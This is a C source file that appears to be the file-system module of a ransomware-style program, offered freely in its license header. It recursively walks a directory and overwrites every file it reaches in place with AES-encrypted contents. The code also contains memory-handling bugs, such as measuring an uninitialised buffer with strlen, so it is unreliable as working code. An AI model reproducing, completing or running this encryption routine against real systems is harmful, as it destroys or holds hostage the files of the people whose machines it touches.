/* Copyright (C) 2023 Sean Kannanaika; - All Rights Reserved
 * You may use, distribute and modify this code under the fact
 * that code and knowledge should not be owned by anyone.  Have
 * at it viewers of my code. Do whatever the hell you want.
 */

//necessary libraries to include
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <dirent.h>
#include <libgen.h>
#include <stdlib.h>
#include <openssl/rsa.h>
#include <openssl/crypto.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/engine.h>
#include "encryption.h"
#include "file_system.h"

/*
@param char string directory name
@return DIR pointer
This program given a directory name will
open the directory and pass a DIR pointer
which can be interacted with
*/
DIR * walkFileSystem(char * dirName) {
    DIR *directory;

    if((directory = opendir(dirName)) == NULL){
        perror("[-] Unable to open Directory! Program Exiting");
        exit(-1);
    }

    return directory;
}

/*
@param oldFilepath current filepath, filename current file name, cipher, key, iv
This function will go through and is asort of helper function for dealing with nested directories
Will end up creating a new directory pointer and walking that file system
*/
void walkInnerDirectory(char * oldFilePath, char * filename, EVP_CIPHER * cipher, char *key, char *iv){
    DIR * inner_directory;
    char newFilePath[1024];

    sprintf(newFilePath, "%s/%s", oldFilePath, filename);

    inner_directory = walkFileSystem(newFilePath);

    walkDirectory(inner_directory, newFilePath, cipher, key, iv);

    closedir(inner_directory);
}
/*
@param filepath, filename, cipher, key, iv
This function will encrypt the contents of the file after reading in all the data, then using
the cipher, key, and iv encrypt the data and write it back into the file
*/
void encryptFile(char * filePath, char * fileName, EVP_CIPHER * cipher, char *key, char *iv){
    char fileNamePath[512];
    char * fileContents = malloc(sizeof(char) * 2048);
    unsigned char * ciphertext;
    FILE *filePointer;
    char readCharacter;
    int index;
    int ciphertext_length;
    char newFilePath[1024];

    index = 0;

    sprintf(fileNamePath, "%s/%s", filePath, fileName);

    filePointer = fopen(fileNamePath, "r");

    while((readCharacter = getc(filePointer)) != EOF){
        if(index == strlen(fileContents) - 2){
            fileContents = realloc(fileContents, strlen(fileContents) + 256);
        }
        fileContents[index] = readCharacter;
        index++;
    }
    ciphertext = malloc(sizeof(char) * strlen(fileContents) + 1);
    ciphertext_length = encryptAES(cipher, ciphertext, key, iv, fileContents);

    fclose(filePointer);

    filePointer = fopen(fileNamePath, "wb");

    fwrite(ciphertext, 1, ciphertext_length, filePointer);

    fclose(filePointer);
}

/*
@param directory pointer, filepath, cipher, key, iv
This function will go through and continue to recursively iterate through
all the files within a given directory as it goes along the way it will start
to encrypt the file contents and write them back in.
*/
void walkDirectory(DIR * directory, char * filePath, EVP_CIPHER * cipher, char *key, char *iv) {
    struct dirent *directory_entry;
    char * ciphertext;
    directory_entry = readdir(directory);
    
    if(directory_entry == NULL){
        return;
    }

    if(directory_entry->d_type == DT_DIR && ((strcmp(directory_entry->d_name, ".") != 0) && (strcmp(directory_entry->d_name, "..") != 0))){
        walkInnerDirectory(filePath, directory_entry->d_name, cipher, key, iv);
    }

    else if(((strcmp(directory_entry->d_name, ".") != 0) && (strcmp(directory_entry->d_name, "..") != 0))){  
        encryptFile(filePath, directory_entry->d_name, cipher, key, iv);
    }
    walkDirectory(directory, filePath, cipher, key, iv);
}
